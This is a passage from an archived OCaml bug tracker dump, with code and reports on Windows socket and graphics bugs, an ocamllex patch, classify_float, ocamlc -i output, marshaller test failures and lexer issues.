sub-range! *)\n       let final_coeffs =\n\t if result_pos==nr_total_vars\n \t  then result_coeffs\n\t  else Array.sub result_coeffs 0 result_pos in\n       {power=lp.power;vars=true_result_vars;coeffs=final_coeffs}\n      else if 0 != (lp_other_vars land bitpow)\n\t   then if 0 != (subs_other_vars land bitpow)\n\t        then let val_to_set =  (get_coeff lp bitpow)*factor_lp\n\t\t                     + (get_coeff to_subs bitpow)*factor_subs in\n\t\t  if val_to_set==0\n\t\t   then fill_result (bitpow+bitpow) result_pos true_result_vars\n\t\t   else (Array.set result_coeffs result_pos val_to_set;\n\t\t\t fill_result (bitpow+bitpow) (1+result_pos) (true_result_vars+bitpow))\n\t        else (* contrib from lp, but not from subs... *)\n    \t          (Array.set result_coeffs result_pos\n\t\t     ((get_coeff lp bitpow)*factor_lp);\n\t\t   fill_result (bitpow+bitpow) (1+result_pos) (true_result_vars+bitpow))\n           else if 0 != (subs_other_vars land bitpow)\n\t\t(* Contrib from subs, but not from lp *)\n\t         then (Array.set result_coeffs result_pos\n\t\t\t ((get_coeff to_subs bitpow)*factor_subs);\n\t\t       fill_result (bitpow+bitpow) (1+result_pos) (true_result_vars+bitpow))\n\t         else (* both contribs zero... *)\n\t          fill_result (bitpow+bitpow) result_pos true_result_vars in\n    let result_lp = fill_result 1 0 0 in\n    if Array.length result_lp.coeffs == 0\n\t(* if we substituted X by X, we get out an empty factor...\n\t   For term normalization purposes, we make 0^0=1.\n\t *)\n    then\n      (result_lp.power <- 0;\n       result_lp.vars <- 0;\n       result_lp)\n    else\n    let coeffs_gcd0 = v_gcd result_lp.coeffs in\n    let coeffs_gcd = if (Array.get result_lp.coeffs 0) < 0 then (-coeffs_gcd0) else coeffs_gcd0 in\n    (* Printf.printf \"coeffs_gcd0=%d coeffs_gcd=%d\\n\" coeffs_gcd0 coeffs_gcd; DDD *)\n    (\n     if coeffs_gcd != 1\n     then Array.iteri (fun pos coeff -> Array.set result_lp.coeffs pos (coeff/coeffs_gcd)) result_lp.coeffs\n     else ();\n     ref_xfactor:= !ref_xfactor */ (power_num  ((Int factor_lp)//(Int coeffs_gcd)) (Int (-lp.power)));\n     result_lp\n    );;\n\n\nlet v_lpower_subs_uniq numcoeff_plus_v_lp var_bitpow to_subs =\n  let (nc,v_lp) = numcoeff_plus_v_lp in\n  let rnc = ref nc in\n  let len_v_lp = Array.length v_lp in\n  let v_lp_subs = Array.map (lpower_subs rnc var_bitpow to_subs) v_lp in\n  (Array.sort (lpower_cmp true) v_lp_subs;\n   let rec trav_uniq pos_src pos_dst =\n     if pos_src == len_v_lp\n      then if pos_dst == pos_src\n            then v_lp_subs\n\t    else Array.sub v_lp_subs 0 pos_dst\n      else (* still work to be done *)\n       if pos_dst==0\n        then (* no terms on stack *)\n\t (Array.set v_lp_subs pos_dst (Array.get v_lp_subs pos_src);\n\t  trav_uniq (1+pos_src) (1+pos_dst))\n\telse\n\t let lp1 = Array.get v_lp_subs (pos_dst-1) in\n\t let lp2 = Array.get v_lp_subs pos_src in\n\t let cmp = lpower_cmp false lp1 lp2 in\n\t if cmp==0 (* combinable terms *)\n\t  then let total_power =  lp1.power + lp2.power in\n\t   if total_power == 0\n\t    then trav_uniq (1+pos_src) (pos_dst-1) (* Term on stack was eaten *)\n\t    else (Array.set v_lp_subs (pos_dst-1)\n\t\t    {power=total_power;\n\t\t     vars=lp1.vars;\n\t\t     coeffs=lp1.coeffs}\n\t\t    (* This conses more often than strictly necessary...\n\t\t       However, I do not want to worry about when I already\n\t\t       have copied a value and may do destructive\n\t\t       modification...\n\t\t     *);\n\t\t  trav_uniq (1+pos_src) pos_dst)\n\t  else (* cmp!=0, which means that we have to transfer next term *)\n\t   (Array.set v_lp_subs pos_dst lp2;\n\t    trav_uniq (1+pos_src) (1+pos_dst)) in\n   let v_lp_subs_uniq = trav_uniq 0 0 in\n   (!rnc,v_lp_subs_uniq));;\n\n\nlet eval_nc_v_lp nc_v_lp v_Ex =\n  let (nc,v_lp)=nc_v_lp in\n  let nr_factors=Array.length v_lp in\n  let bitmask = (1 lsl (Array.length v_Ex))-1 in\n  (* quick hack: use a v_lp to retrieve coeff data... *)\n  let eval_lp={power=0;vars=bitmask;coeffs=v_Ex} in\n  let rec trav so_far n =\n    if n == nr_factors then so_far else\n    let factor_n = Array.get v_lp n in\n    let coeffs_n = factor_n.coeffs in\n    let nr_coeffs=Array.length coeffs_n in\n    let rec trav_vars rest_vars bitpow sum_now =\n      if rest_vars==0\n      then sum_now\n      else if (bitpow land rest_vars) == 0\n            then trav_vars rest_vars (bitpow+bitpow) sum_now\n\t    else\n\t     let coeff_j = get_coeff factor_n bitpow in\n\t     let var_j = get_coeff eval_lp bitpow in\n\t     trav_vars (rest_vars-bitpow) (bitpow+bitpow) (sum_now+/ (Int coeff_j) */ (Int var_j))\n    in let val_factor_n = trav_vars factor_n.vars 1 (Int 0) in\n    trav (so_far*/(power_num val_factor_n (Int factor_n.power))) (1+ n) in\n  trav nc 0;;\n\nlet check_substitution nc_v_lp =\n  let debug_lp_res = {power = -1; vars = 80; coeffs = [|3; -2|]} in\n  let v_eval =  [|0;1000;1100;1110;-1000-1100-1110;101;3*(-1000-1100-1110)/2|] in\n  let var_bitpow = 1 lsl ((integer_length debug_lp_res.vars)-1) in\n  let substituted = v_lpower_subs_uniq nc_v_lp var_bitpow debug_lp_res in\n  let val_substituted = eval_nc_v_lp substituted v_eval in\n  let val_direct = eval_nc_v_lp nc_v_lp v_eval in\n  let difference = val_substituted-/val_direct in\n  (* List.map string_of_num [val_substituted;val_direct;difference] *)\n  string_of_num difference;;\n\nlet debug_v_lp=\n((Int (-16))//(Int 3),\n [|{power = 0; vars = 0; coeffs = [||]};\n   {power = 3; vars = 16; coeffs = [|1|]};\n   {power = -1; vars = 18; coeffs = [|1; -2|]};\n   {power = -3; vars = 18; coeffs = [|1; -1|]};\n   {power = -3; vars = 18; coeffs = [|1; 1|]};\n   {power = -1; vars = 18; coeffs = [|1; 2|]};\n   {power = -1; vars = 20; coeffs = [|1; -2|]};\n   {power = -3; vars = 20; coeffs = [|1; -1|]};\n   {power = -3; vars = 20; coeffs = [|1; 1|]};\n   {power = -1; vars = 20; coeffs = [|1; 2|]};\n   {power = 1; vars = 22; coeffs = [|1; 1; -2|]};\n   {power = 3; vars = 22; coeffs = [|1; 1; -1|]};\n   {power = 3; vars = 22; coeffs = [|1; 1; 1|]};\n   {power = 1; vars = 22; coeffs = [|1; 1; 2|]};\n   {power = -1; vars = 24; coeffs = [|1; -2|]};\n   {power = -3; vars = 24; coeffs = [|1; -1|]};\n   {power = -3; vars = 24; coeffs = [|1; 1|]};\n   {power = -1; vars = 24; coeffs = [|1; 2|]};\n   {power = 1; vars = 26; coeffs = [|1; 1; -2|]};\n   {power = 3; vars = 26; coeffs = [|1; 1; -1|]};\n   {power = 3; vars = 26; coeffs = [|1; 1; 1|]};\n   {power = 1; vars = 26; coeffs = [|1; 1; 2|]};\n   {power = 1; vars = 28; coeffs = [|1; 1; -2|]};\n   {power = 3; vars = 28; coeffs = [|1; 1; -1|]};\n   {power = 3; vars = 28; coeffs = [|1; 1; 1|]};\n   {power = 1; vars = 28; coeffs = [|1; 1; 2|]};\n   {power = 2; vars = 32; coeffs = [|1|]};\n   {power = -2; vars = 34; coeffs = [|1; -2|]};\n   {power = -2; vars = 34; coeffs = [|1; 2|]};\n   {power = -2; vars = 36; coeffs = [|1; -2|]};\n   {power = -2; vars = 36; coeffs = [|1; 2|]};\n   {power = 2; vars = 38; coeffs = [|1; 1; -2|]};\n   {power = 2; vars = 38; coeffs = [|1; 1; 2|]};\n   {power = -2; vars = 40; coeffs = [|1; -2|]};\n   {power = -2; vars = 40; coeffs = [|1; 2|]};\n   {power = 2; vars = 42; coeffs = [|1; 1; -2|]};\n   {power = 2; vars = 42; coeffs = [|1; 1; 2|]};\n   {power = 2; vars = 44; coeffs = [|1; 1; -2|]};\n   {power = 2; vars = 44; coeffs = [|1; 1; 2|]};\n   {power = -1; vars = 48; coeffs = [|1; -2|]};\t\n   {power = 1; vars = 48; coeffs = [|1; -1|]};\n   {power = 1; vars = 48; coeffs = [|1; 1|]};\n   {power = -1; vars = 48; coeffs = [|1; 2|]};\n   {power = -1; vars = 48; coeffs = [|3; -2|]};\n   {power = -1; vars = 48; coeffs = [|3; 2|]};\n   {power = -1; vars = 50; coeffs = [|1; -2; -2|]};\n   {power = -1; vars = 50; coeffs = [|1; -2; 2|]};\n   {power = -1; vars = 50; coeffs = [|1; -1; -2|]};\n   {power = -1; vars = 50; coeffs = [|1; -1; 2|]};\n   {power = -1; vars = 50; coeffs = [|1; 1; -2|]};\n   {power = -1; vars = 50; coeffs = [|1; 1; 2|]};\n   {power = -1; vars = 50; coeffs = [|1; 2; -2|]};\n   {power = -1; vars = 50; coeffs = [|1; 2; 2|]};\n   {power = -1; vars = 52; coeffs = [|1; -2; -2|]};\n   {power = -1; vars = 52; coeffs = [|1; -2; 2|]};\n   {power = -1; vars = 52; coeffs = [|1; -1; -2|]};\n   {power = -1; vars = 52; coeffs = [|1; -1; 2|]};\n   {power = -1; vars = 52; coeffs = [|1; 1; -2|]};\n   {power = -1; vars = 52; coeffs = [|1; 1; 2|]};\n   {power = -1; vars = 52; coeffs = [|1; 2; -2|]};\n   {power = -1; vars = 52; coeffs = [|1; 2; 2|]};\n   {power = 1; vars = 54; coeffs = [|1; 1; -2; -2|]};\n   {power = 1; vars = 54; coeffs = [|1; 1; -2; 2|]};\n   {power = 1; vars = 54; coeffs = [|1; 1; -1; -2|]};\n   {power = 1; vars = 54; coeffs = [|1; 1; -1; 2|]};\n   {power = 1; vars = 54; coeffs = [|1; 1; 1; -2|]};\n   {power = 1; vars = 54; coeffs = [|1; 1; 1; 2|]};\n   {power = 1; vars = 54; coeffs = [|1; 1; 2; -2|]};\n   {power = 1; vars = 54; coeffs = [|1; 1; 2; 2|]};\n   {power = -1; vars = 56; coeffs = [|1; -2; -2|]};\n   {power = -1; vars = 56; coeffs = [|1; -2; 2|]};\n   {power = -1; vars = 56; coeffs = [|1; -1; -2|]};\n   {power = -1; vars = 56; coeffs = [|1; -1; 2|]};\n   {power = -1; vars = 56; coeffs = [|1; 1; -2|]};\n   {power = -1; vars = 56; coeffs = [|1; 1; 2|]};\n   {power = -1; vars = 56; coeffs = [|1; 2; -2|]};\n   {power = -1; vars = 56; coeffs = [|1; 2; 2|]};\n   {power = 1; vars = 58; coeffs = [|1; 1; -2; -2|]};\n   {power = 1; vars = 58; coeffs = [|1; 1; -2; 2|]};\n   {power = 1; vars = 58; coeffs = [|1; 1; -1; -2|]};\n   {power = 1; vars = 58; coeffs = [|1; 1; -1; 2|]};\n   {power = 1; vars = 58; coeffs = [|1; 1; 1; -2|]};\n   {power = 1; vars = 58; coeffs = [|1; 1; 1; 2|]};\n   {power = 1; vars = 58; coeffs = [|1; 1; 2; -2|]};\n   {power = 1; vars = 58; coeffs = [|1; 1; 2; 2|]};\n   {power = 1; vars = 60; coeffs = [|1; 1; -2; -2|]};\n   {power = 1; vars = 60; coeffs = [|1; 1; -2; 2|]};\n   {power = 1; vars = 60; coeffs = [|1; 1; -1; -2|]};\n   {power = 1; vars = 60; coeffs = [|1; 1; -1; 2|]};\n   {power = 1; vars = 60; coeffs = [|1; 1; 1; -2|]};\n   {power = 1; vars = 60; coeffs = [|1; 1; 1; 2|]};\n   {power = 1; vars = 60; coeffs = [|1; 1; 2; -2|]};\n   {power = 1; vars = 60; coeffs = [|1; 1; 2; 2|]};\n   {power = 1; vars = 64; coeffs = [|1|]};\n   {power = -1; vars = 66; coeffs = [|1; -2|]};\n   {power = -1; vars = 66; coeffs = [|1; 2|]};\n   {power = -1; vars = 68; coeffs = [|1; -2|]};\n   {power = -1; vars = 68; coeffs = [|1; 2|]};\n   {power = 1; vars = 70; coeffs = [|1; 1; -2|]};\n   {power = 1; vars = 70; coeffs = [|1; 1; 2|]};\n   {power = -1; vars = 72; coeffs = [|1; -2|]};\n   {power = -1; vars = 72; coeffs = [|1; 2|]};\n   {power = 1; vars = 74; coeffs = [|1; 1; -2|]};\n   {power = 1; vars = 74; coeffs = [|1; 1; 2|]};\n   {power = 1; vars = 76; coeffs = [|1; 1; -2|]};\n   {power = 1; vars = 76; coeffs = [|1; 1; 2|]};\n   {power = 1; vars = 80; coeffs = [|1; -1|]};\n   {power = -1; vars = 80; coeffs = [|1; 2|]};\n   {power = 0; vars = 80; coeffs = [|3; -2|]};\n   {power = -1; vars = 82; coeffs = [|1; -2; 2|]};\n   {power = -1; vars = 82; coeffs = [|1; -1; 2|]};\n   {power = -1; vars = 82; coeffs = [|1; 1; -2|]};\n   {power = -1; vars = 82; coeffs = [|1; 2; -2|]};\n   {power = -1; vars = 84; coeffs = [|1; -2; 2|]};\n   {power = -1; vars = 84; coeffs = [|1; -1; 2|]};\n   {power = -1; vars = 84; coeffs = [|1; 1; -2|]};\n   {power = -1; vars = 84; coeffs = [|1; 2; -2|]};\n   {power = 1; vars = 86; coeffs = [|1; 1; -2; 2|]};\n   {power = 1; vars = 86; coeffs = [|1; 1; -1; 2|]};\n   {power = 1; vars = 86; coeffs = [|1; 1; 1; -2|]};\n   {power = 1; vars = 86; coeffs = [|1; 1; 2; -2|]};\n   {power = -1; vars = 88; coeffs = [|1; -2; 2|]};\n   {power = -1; vars = 88; coeffs = [|1; -1; 2|]};\n   {power = -1; vars = 88; coeffs = [|1; 1; -2|]};\n   {power = -1; vars = 88; coeffs = [|1; 2; -2|]};\n   {power = 1; vars = 90; coeffs = [|1; 1; -2; 2|]};\n   {power = 1; vars = 90; coeffs = [|1; 1; -1; 2|]};\n   {power = 1; vars = 90; coeffs = [|1; 1; 1; -2|]};\n   {power = 1; vars = 90; coeffs = [|1; 1; 2; -2|]};\n   {power = 1; vars = 92; coeffs = [|1; 1; -2; 2|]};\n   {power = 1; vars = 92; coeffs = [|1; 1; -1; 2|]};\n   {power = 1; vars = 92; coeffs = [|1; 1; 1; -2|]};\n   {power = 1; vars = 92; coeffs = [|1; 1; 2; -2|]};\n   {power = 1; vars = 96; coeffs = [|1; -1|]};\n   {power = 1; vars = 96; coeffs = [|1; 1|]};\n   {power = -2; vars = 98; coeffs = [|1; -1; -1|]};\n   {power = -2; vars = 98; coeffs = [|1; -1; 1|]};\n   {power = -2; vars = 98; coeffs = [|1; 1; -1|]};\n   {power = -2; vars = 98; coeffs = [|1; 1; 1|]};\n   {power = -2; vars = 100; coeffs = [|1; -1; -1|]};\n   {power = -2; vars = 100; coeffs = [|1; -1; 1|]};\n   {power = -2; vars = 100; coeffs = [|1; 1; -1|]};\n   {power = -2; vars = 100; coeffs = [|1; 1; 1|]};\n   {power = 2; vars = 102; coeffs = [|1; 1; -1; -1|]};\n   {power = 2; vars = 102; coeffs = [|1; 1; -1; 1|]};\n   {power = 2; vars = 102; coeffs = [|1; 1; 1; -1|]};\n   {power = 2; vars = 102; coeffs = [|1; 1; 1; 1|]};\n   {power = -2; vars = 104; coeffs = [|1; -1; -1|]};\n   {power = -2; vars = 104; coeffs = [|1; -1; 1|]};\n   {power = -2; vars = 104; coeffs = [|1; 1; -1|]};\n   {power = -2; vars = 104; coeffs = [|1; 1; 1|]};\n   {power = 2; vars = 106; coeffs = [|1; 1; -1; -1|]};\n   {power = 2; vars = 106; coeffs = [|1; 1; -1; 1|]};\n   {power = 2; vars = 106; coeffs = [|1; 1; 1; -1|]};\n   {power = 2; vars = 106; coeffs = [|1; 1; 1; 1|]};\n   {power = 2; vars = 108; coeffs = [|1; 1; -1; -1|]};\n   {power = 2; vars = 108; coeffs = [|1; 1; -1; 1|]};\n   {power = 2; vars = 108; coeffs = [|1; 1; 1; -1|]};\n   {power = 2; vars = 108; coeffs = [|1; 1; 1; 1|]};\n   {power = 1; vars = 112; coeffs = [|1; -1; -1|]};\n   {power = 1; vars = 112; coeffs = [|1; 1; -1|]};\n   {power = -1; vars = 112; coeffs = [|2; -1; 1|]};\n   {power = -1; vars = 112; coeffs = [|2; 1; 1|]};\n   {power = -1; vars = 112; coeffs = [|3; -1; -1|]};\n   {power = -1; vars = 112; coeffs = [|3; 1; -1|]};\n   {power = -1; vars = 114; coeffs = [|1; -2; -1; 1|]};\n   {power = -1; vars = 114; coeffs = [|1; -2; 1; 1|]};\n   {power = -1; vars = 114; coeffs = [|1; -1; -1; -1|]};\n   {power = -2; vars = 114; coeffs = [|1; -1; -1; 1|]};\n   {power = -1; vars = 114; coeffs = [|1; -1; 1; -1|]};\n   {power = -2; vars = 114; coeffs = [|1; -1; 1; 1|]};\n   {power = -2; vars = 114; coeffs = [|1; 1; -1; -1|]};\n   {power = -1; vars = 114; coeffs = [|1; 1; -1; 1|]};\n   {power = -2; vars = 114; coeffs = [|1; 1; 1; -1|]};\n   {power = -1; vars = 114; coeffs = [|1; 1; 1; 1|]};\n   {power = -1; vars = 114; coeffs = [|1; 2; -1; -1|]};\n   {power = -1; vars = 114; coeffs = [|1; 2; 1; -1|]};\n   {power = -1; vars = 116; coeffs = [|1; -2; -1; 1|]};\n   {power = -1; vars = 116; coeffs = [|1; -2; 1; 1|]};\n   {power = -1; vars = 116; coeffs = [|1; -1; -1; -1|]};\n   {power = -2; vars = 116; coeffs = [|1; -1; -1; 1|]};\n   {power = -1; vars = 116; coeffs = [|1; -1; 1; -1|]};\n   {power = -2; vars = 116; coeffs = [|1; -1; 1; 1|]};\n   {power = -2; vars = 116; coeffs = [|1; 1; -1; -1|]};\n   {power = -1; vars = 116; coeffs = [|1; 1; -1; 1|]};\n   {power = -2; vars = 116; coeffs = [|1; 1; 1; -1|]};\n   {power = -1; vars = 116; coeffs = [|1; 1; 1; 1|]};\n   {power = -1; vars = 116; coeffs = [|1; 2; -1; -1|]};\n   {power = -1; vars = 116; coeffs = [|1; 2; 1; -1|]};\n   {power = 1; vars = 118; coeffs = [|1; 1; -2; -1; 1|]};\n   {power = 1; vars = 118; coeffs = [|1; 1; -2; 1; 1|]};\n   {power = 1; vars = 118; coeffs = [|1; 1; -1; -1; -1|]};\n   {power = 2; vars = 118; coeffs = [|1; 1; -1; -1; 1|]};\n   {power = 1; vars = 118; coeffs = [|1; 1; -1; 1; -1|]};\n   {power = 2; vars = 118; coeffs = [|1; 1; -1; 1; 1|]};\n   {power = 2; vars = 118; coeffs = [|1; 1; 1; -1; -1|]};\n   {power = 1; vars = 118; coeffs = [|1; 1; 1; -1; 1|]};\n   {power = 2; vars = 118; coeffs = [|1; 1; 1; 1; -1|]};\n   {power = 1; vars = 118; coeffs = [|1; 1; 1; 1; 1|]};\n   {power = 1; vars = 118; coeffs = [|1; 1; 2; -1; -1|]}|]);;\n\nlet rec trav n =\n  if n == 10 then () else\n  (Printf.printf \"%d ==> %s\\n\" n (check_substitution debug_v_lp);\n   trav (1+ n))\n    in trav 0;;\n\n\n----- End forwarded message -----\n"},{"labels":["bug"],"text":"**Original bug ID:** 1988\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Benjamin Leperchey\nVersion: 3.07+2\nOS: Windows\nSubmission from: amontsouris-108-1-6-52.w193-253.abo.wanadoo.fr (193.253.239.52)\n\n\nEncore bonjour, \n\nJ'avais oublie de preciser que la taille de la fenetre graphics\nn'est pas la meme sous linux et windows: il semble que sous windows,\non compte la taille totale (et pas la taille utile).\n\nAutre chose: on ne peut pas a la fois attendre en lecture et ecrire\nsur une socket (en tout cas sur une socket UDP) avec Windows XP:\n\nopen Unix\n\nlet sock = socket PF_INET SOCK_DGRAM 0\nlet addr = ADDR_INET(inet_addr_of_string \"127.0.0.1\", 7896)\n\nlet write() =\n   let out = \"hello world\" in\n   ignore (sendto sock out 0 (String.length out) [] addr)\n\nlet listen() =\n   let inp =  String.make 20 ' ' in\n   let _ = recvfrom sock inp 0 20 [] in\n   print_string inp;\n   print_newline()\n\nlet _=\n   bind sock addr;\n   write();\n   listen();\n\n   ignore (Thread.create listen ());\n   print_string \"now listening...\"; print_newline();\n   write();\n   print_string \"write ok\"; print_newline()\n\nje compile avec \"ocamlc -o test -thread unix.cma threads.cma test.ml\"\n\nOn observe bien le premier \"hello world\" recu (quand l'ecriture et la lecture\nsont distinctes), mais le deuxieme sendto (effectue alors que l'autre thread \necoute sur la meme socket) ne termine pas (ici on s'ecrit a soi-meme, mais le\nprobleme est toujours la quand on ecrit a une autre socket sur la meme machine,\nje n'ai pas essaye entre deux machines differentes).\n\nCa marche sans probleme sous linux.\n\nCordialement,\n\n  Benjamin\n"},{"labels":["bug"],"text":"**Original bug ID:** 1987\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Benjamin Leperchey\nVersion: 3.07+2\nOS: Windows XP, linux\nSubmission from: amontsouris-108-1-6-52.w193-253.abo.wanadoo.fr (193.253.239.52)\n\n\n[Il est possible que ce message soit duplique, je m'en excuse d'avance]\n\nBonjour,\n\nj'ai releve ce qui ressemble a un bug dans la librairie graphics sous\nwindows, avec la distribution 3.07+2. Lorsque que je compile en bytecode\net que j'execute le code suivant:\n\nopen Graphics\n\nlet _=\nopen_graph \" 100x100\";\n\nwhile true do\n   if key_pressed()\n   then begin\n     print_string \"key\";\n     print_newline();\n     print_char (read_key());\n     print_newline() end\ndone\nSupposons qu'on tape 0,1 puis 2.\nLe comportement attendu (qui est celui de la version linux) est:\nkey\n0    apres 0\nkey\n1    apres 1\nkey\n2    apres 2\n\nSous windows, on voit\nkey   apres 0\n1\nkey   apres 1\n2\nkey   apres 2\n\n\nkey_pressed \"mange\" la premiere touche (l'appel a read_key est alors\nbloquant), mais repond vrai sur la touche suivante...\n\n\n\nD'autre part, utiliser close_graph puis open_graph laisse souvent deux\nfenetres (existe-t-il un autre moyen de redimensionner la fenetre ?). En\nmettant un delai entre les deux, ca marche mieux, mais pas toujours.\n\n\n\nEt enfin, et ceci s'applique aussi a la version Linux, il faudrait\nindiquer quelque part dans la doc qu'il ne faut pas utiliser des threads\navec graphics, si possible en vue (les bugs obtenus sont aleatoires, et\nils font planter le programme, apparemment sans raison, ce qui est tres\nagacant). Il semble que tout marche plus ou moins si on effectue tous les\nappels a graphics depuis le meme thread, mais des signaux sont lances au\nprogramme (ce qui cause des erreurs Unix_error(EINTR,_,_) a des endroits\ndu programme qui n'ont absolument rien a voir)\n\nCordialement,\n\n  Benjamin\n"},{"labels":["bug"],"text":"**Original bug ID:** 1986\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Andrei de A. Formiga\nVersion: 3.07\nOS: Windows XP\nSubmission from: pw117.neoline.com.br (200.141.132.117)\n\n\nThis bug applies to using the open_connection function from the Unix module in\nthe Windows XP native version of OCaml. A session transcript that reproduces the\nerror is below:\n\n# #load \"Unix.cma\";;\n# let irc_addr = Unix.ADDR_INET (Unix.inet_addr_of_string \"200.199.102.186\",\n6667);;\nval irc_addr : Unix.sockaddr = Unix.ADDR_INET (<abstr>, 6667)\n# let irc_in, irc_out = Unix.open_connection irc_addr;;\nval irc_in : in_channel = <abstr>\nval irc_out : out_channel = <abstr>\n# input_line irc_in;;\nException: Sys_error \"Bad file descriptor\".\n# Unix.shutdown_connection irc_in;;\nException: Unix.Unix_error (Unix.ENOTSOCK, \"shutdown\", \"\").\n\nThe OCaml manual states that Unix.open_connection should be available on\nWindows. Further investigation of the implementation of Unix.open_connection\nshows that it uses the functions Unix.in_channel_of_descr and\nUnix.out_channel_of_descr. Somewhere in the documentation in the unix version it\nis mentioned that both in_channel_of_descr and out_channel_of_descr don't work\non sockets under Windows 95, 98 and ME, but work under Windows NT and 2000.\nCompatibility with Windows XP is not specified. It is possible that the bug is\nin the implementation of in_channel_of_descr and out_channel_of_descr.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1984\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHere's a small and self-explanatory bug fix for ocamllex.\n\n-- Mike Spivey\n\n*** lex/main.ml.orig\tWed Dec 17 15:39:55 2003\n--- lex/main.ml\tWed Dec 17 15:39:57 2003\n***************\n*** 26,32 ****\n  let specs =\n    [\"-ml\", Arg.Set ml_automata,\n      \" Output code that does not use the Lexing module built-in automata\ninterpreter\";\n!    \"-o\", Arg.String (fun x -> source_name := Some x),\n      \" <file>  Set output file name to <file>\";\n     \"-q\", Arg.Set Common.quiet_mode, \" Do not display informational\nmessages\";\n    ]\n--- 26,32 ----\n  let specs =\n    [\"-ml\", Arg.Set ml_automata,\n      \" Output code that does not use the Lexing module built-in automata\ninterpreter\";\n!    \"-o\", Arg.String (fun x -> output_name := Some x),\n      \" <file>  Set output file name to <file>\";\n     \"-q\", Arg.Set Common.quiet_mode, \" Do not display informational\nmessages\";\n    ]\n"},{"labels":["bug"],"text":"**Original bug ID:** 1982\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Shawn Wagner\nVersion: 3.07+2\nOS: linux\nSubmission from: dialup-67.75.211.174.dial1.seattle.level3.net (67.75.211.174)\n\n\nclassify_float appears to be broken, always returning FP_subnormal no matter the\nnumber  it's called on. Witness:\n\n[shawnw@sherlock shawnw]$ ocaml\n        Objective Caml version 3.07+2\n\n# classify_float 0.0;;\n- : fpclass = FP_subnormal\n# classify_float 1.0;;\n- : fpclass = FP_subnormal\n# classify_float infinity;;\n- : fpclass = FP_subnormal\n# classify_float nan;;\n- : fpclass = FP_subnormal\n# classify_float 1e25;;\n- : fpclass = FP_subnormal\n#\n"},{"labels":["bug"],"text":"**Original bug ID:** 1981\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jim Farrand\nVersion: 3.07+2\nOS: Gentoo GNU/Linux\nSubmission from: 81-178-212-117.dsl.pipex.com (81.178.212.117)\n\n\nIncorrect output generated by ocamlc -i:\n\njim@draco src $ cat test.ml\n\nclass a =\n  object\n    method x : b -> unit = fun _ -> () ;\n  end\nand b =\n  object\n    method x : a -> unit = fun _ -> () ;\n  end ;;\n   \njim@draco src $ ocamlc -i test.ml\nclass a : object method x : b -> unit end\nclass b : object method x : a -> unit end\n\nThis output doesn't compile when passed back into ocamlc, as b is not defined at\nthe time it is used in the definition of a.\n\nThe correct output should be:\n\nclass a : object method x : b -> unit end\nand b : object method x : a -> unit end\n"},{"labels":["bug"],"text":"**Original bug ID:** 1979\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI am having problems with the marshaller (I am getting a segfault in the \nmarshaller) on the AMD x86_64 (Opteron) running Fedora Core development \nversion (AKA Red Hat Raw Hide) and OCaml 3.07+2.\n\nTo figure out what is going on, I tried running some tests.\n\nWhen I run test/Moretest/intext.byt, I get:\n\n...\nTest 223 passed.\nTest 300 passed.\nUncaught exception: Failure(\"input_value_from_block: bad object\")\nExit 2\n\nWhen I run test/Moretest/intext.out, I get:\n\n...\nTest 223 passed.\nTest 300 passed.\nTest 401 FAILED.\nTest 402 FAILED.\nTest 403 FAILED.\nTest 404 FAILED.\nTest 405 FAILED.\nTest 406 FAILED.\nTest 407 FAILED.\nTest 408 FAILED.\nTest 409 passed.\nTest 410 FAILED.\nTest 411 FAILED.\nTest 412 FAILED.\nTest 413 FAILED.\nTest 414 FAILED.\nTest 415 FAILED.\nTest 416 FAILED.\nTest 417 FAILED.\nTest 418 FAILED.\nTest 419 FAILED.\nTest 420 FAILED.\nTest 421 FAILED.\nTest 422 FAILED.\nTest 423 passed.\nTest 424 passed.\n\nDo these indicate a bug? Or is this expected and I should look for the \nsource of my problems elsewhere?\n\n-- \nAleksey Nogin\n\nHome Page: http://nogin.org/\nE-Mail: nogin@cs.caltech.edu (office), aleksey@nogin.org (personal)\nOffice: Jorgensen 70, tel: (626) 395-2907\n"},{"labels":["bug"],"text":"**Original bug ID:** 1978\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Peter Hercek\nVersion: 3.07+2\nOS: Linux\nSubmission from: ethernet-012-packplace.citizens.swva.net.66.37.66.in-addr.arpa (66.37.66.12)\n\n\nHi,\n\nI checked it on Linux, but the behavior is the same on Windows with version\n3.07.\nThis may be a documentation error and not an OCaml parser/lexer error. My report\nis based on the pdf documentation for OCaml 3.07 (September 29, 2003).\n\nHere is my test with OCaml console:\nObjective Caml version 3.07+2\n# let f x:[<|`A|`B] = x;;\nval f : ([< `A | `B ] as 'a) -> 'a = <fun>\n# let f x:[>|`A|`B] = x;;\nSyntax error\n# let f x:[> |`A|`B] = x;;\n# #quit;;\n\nIt looks like the reason is that \">|\" is a lexical symbol and \"[>\" is not a\nlexical symbol.\nWell, \"[>\" should not be lexical symbol based on the BNF grammar for\n\"variant-type\" nonterminal. Uff, this reasoning is valid for \"[<\" too and \"[<\"\nis a keyword (ie a lexical symbol). On the other side \">|\" should not be a\nlexical symbol, because there is no mention about in in the whole OCaml 3.07\nmanual.\n\nRegards,\n   